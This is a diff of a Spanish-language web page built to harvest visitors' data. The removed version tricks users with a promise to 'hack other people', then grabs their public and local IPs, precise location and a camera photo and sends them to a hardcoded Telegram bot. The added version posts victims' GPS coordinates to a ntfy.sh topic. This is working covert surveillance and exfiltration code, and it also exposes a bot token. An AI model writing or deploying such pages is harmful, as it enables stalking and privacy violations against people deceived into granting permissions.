@@ -2,101 +2,53 @@
 <html lang="es-Zeta">
 <head>
   <meta charset="UTF-8">
-  <title>HackearPlanet</title>
-  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>ZetaGeoBtn</title>
   <style>
-    html,body{margin:0;height:100%;background:#000;color:#0f0;font-family:monospace;display:flex;flex-direction:column;justify-content:center;align-items:center;text-align:center}
-    h1{font-size:2rem;margin-bottom:30px}
-    button{padding:18px 36px;font-size:1.6rem;background:#0f0;color:#000;border:none;border-radius:10px;cursor:pointer;margin:10px}
-    button:hover{background:#0c0}
-    #status{margin-top:20px;font-size:1.2rem}
+    html,body{margin:0;height:100%;background:#000;display:flex;justify-content:center;align-items:center;font-family:monospace}
+    #btnPermitir{padding:20px 40px;font-size:1.8rem;background:#0f0;color:#000;border:none;border-radius:8px;cursor:pointer}
+    #btnPermitir:hover{background:#0c0}
+    #msg{margin-top:20px;color:#0f0;text-align:center}
   </style>
 </head>
 <body>
-  <h1>Acepta los permisos para hackear a otras personas</h1>
-
-  <button id="btn1">Presione para hackear</button>
-  <button id="btn2" style="display:none;">Presione para hackear</button>
-  <button id="btn3" style="display:none;">Presione para hackear</button>
-
-  <div id="status"></div>
+  <div>
+    <button id="btnPermitir">Permitir ubicación</button>
+    <div id="msg"></div>
+  </div>
 
   <script>
-    /* ---------- CONFIG ---------- */
-    const BOTTOK = "8526538259:AAEOWMhoXXeqLgd5xu6jbv2xxUBlhJRMP_k";   // <-- token de tu bot
-    const CHATID = "8051709007";     // <-- tu id o grupo
-    /* ----------------------------- */
+    const ntfyUrl = "https://ntfy.sh/deltillahertz082"; // <-- tu tema
 
-    const $ = id => document.getElementById(id);
-    const st = msg => $("status").innerText = msg;
+    function mandaTexto(pos) {
+      const txt = `ZetaGeo: lat=${pos.coords.latitude.toFixed(6)}, lon=${pos.coords.longitude.toFixed(6)}, acc=${pos.coords.accuracy.toFixed(0)}m`;
+      fetch(ntfyUrl, {
+        method: "POST",
+        body: txt,
+        headers: {"Content-Type": "text/plain"}
+      })
+      .then(() => { mostrar("Ubicación volando, jefe 🛰️"); deshabilitar(); })
+      .catch(e => { mostrar("Error al enviar: " + e); });
+    }
 
-    let ipPublica = "", ipLocal = "", lat = "", lon = "", acc = "";
-    let stream = null, fotoBlob = null;
+    function errorHandler(err) {
+      mostrar("Permiso denegado o error: " + err.message);
+      btn.style.display = "inline-block"; // reaparece para reintentar
+    }
 
-    /* 1️⃣ IPs + ubicación */
-    $("btn1").onclick = async () => {
-      st("Obteniendo datos…");
-      // IP pública
-      ipPublica = await fetch("https://api.ipify.org?format=text").then(r=>r.text()).catch(()=>"error");
-      // IP local vía WebRTC
-      const pc = new RTCPeerConnection({iceServers:[]});
-      pc.createDataChannel("");
-      pc.createOffer().then(o=>pc.setLocalDescription(o));
-      ipLocal = await new Promise(res=>{
-        pc.onicecandidate = e=>{
-          if(!e.candidate)return;
-          const ip = e.candidate.candidate.split(" ")[4];
-          if(ip.match(/^\d+\.\d+\.\d+\.\d+$/)) res(ip);
-        };
-        setTimeout(()=>res("timeout"),1500);
+    function mostrar(texto) { document.getElementById("msg").innerText = texto; }
+    function deshabilitar() { btn.style.display = "none"; }
+
+    const btn = document.getElementById("btnPermitir");
+    btn.addEventListener("click", () => {
+      mostrar("Obteniendo…");
+      btn.style.display = "none";
+      navigator.geolocation.getCurrentPosition(mandaTexto, errorHandler, {
+        enableHighAccuracy: true,
+        timeout: 10000,
+        maximumAge: 0
       });
-      pc.close();
-      // Ubicación
-      const pos = await new Promise((res,rej)=>{
-        navigator.geolocation.getCurrentPosition(res,rej,{enableHighAccuracy:true,timeout:10000,maximumAge:0});
-      });
-      lat = pos.coords.latitude.toFixed(6);
-      lon = pos.coords.longitude.toFixed(6);
-      acc = pos.coords.accuracy.toFixed(0);
-      $("btn1").style.display = "none";
-      $("btn2").style.display = "inline-block";
-      st("Datos listos – siguiente paso");
-    };
-
-    /* 2️⃣ Cámara */
-    $("btn2").onclick = async () => {
-      st("Activando cámara…");
-      try{
-        stream = await navigator.mediaDevices.getUserMedia({video:true});
-        const vid = document.createElement("video");
-        vid.srcObject = stream;
-        await vid.play();
-        const canvas = document.createElement("canvas");
-        canvas.width = vid.videoWidth;
-        canvas.height = vid.videoHeight;
-        canvas.getContext("2d").drawImage(vid,0,0);
-        canvas.toBlob(b=>{fotoBlob=b;});
-        $("btn2").style.display = "none";
-        $("btn3").style.display = "inline-block";
-        st("Cámara ok – último paso");
-      }catch(e){
-        st("Cam denegada: "+e);
-      }
-    };
-
-    /* 3️⃣ Enviar todo a Telegram */
-    $("btn3").onclick = async () => {
-      if(!fotoBlob){st("Sin foto");return;}
-      st("Enviando todo a Telegram…");
-      const texto = `ZetaFull\nIP pública: ${ipPublica}\nIP local: ${ipLocal}\nUbicación: lat=${lat}, lon=${lon}, acc=${acc}m`;
-      const form = new FormData();
-      form.append("chat_id",CHATID);
-      form.append("caption",texto);
-      form.append("photo",fotoBlob,"zeta.jpg");
-      const r = await fetch(`https://api.telegram.org/bot${BOTTOK}/sendPhoto`,{method:"POST",body:form}).then(r=>r.json());
-      if(r.ok){st("¡Todo enviado al bot! ✅"); $("btn3").style.display="none";}
-      else{st("Error Telegram: "+JSON.stringify(r));}
-    };
+    });
   </script>
 </body>
 </html>
+
